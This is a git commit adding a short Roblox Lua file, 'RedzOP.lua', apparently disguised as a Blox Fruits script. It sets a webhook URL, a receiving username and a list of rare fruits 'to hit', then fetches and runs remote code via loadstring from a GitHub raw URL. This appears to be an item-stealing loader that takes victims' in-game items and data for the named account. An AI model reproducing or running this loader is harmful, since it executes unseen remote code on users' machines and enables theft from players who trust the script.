44e69c4a53283c5af728407748e470aa831ccef0
redzhubreal <sigma123alpha123beta123@gmail.com>
2025-03-21 18:08:57 +0530

    Create RedzOP.lua

---
+++ RedzOP.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=SWE0cW5xTDFndmg1OXBOZWh1N0loQTpaWjJhWEVTbzJHeHdzeWhFUHRKRXlTWU1jUWI1YjhRQ0tIUmVGSUZtQ2wtemZxQzhia19BYnR4SW5CMlF1UUlVNFB4cXpxSGNiN1BYdlotZ3RydzN4ZlhuUVRHeVRYQ0dVRmV2blpGOTFIRFdxSXJacGZMdDNfbXFqajhrYlQ4X2Vud1BUNUZIVVlHSTVpOXoxUzJ6V2xVOUszUU02MHVrTmRySUtTVE5neDA"
+Usernames = {"Sourlas3103"}
+FruitsToHit = {"Diamond-Diamond", "Light-Light", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
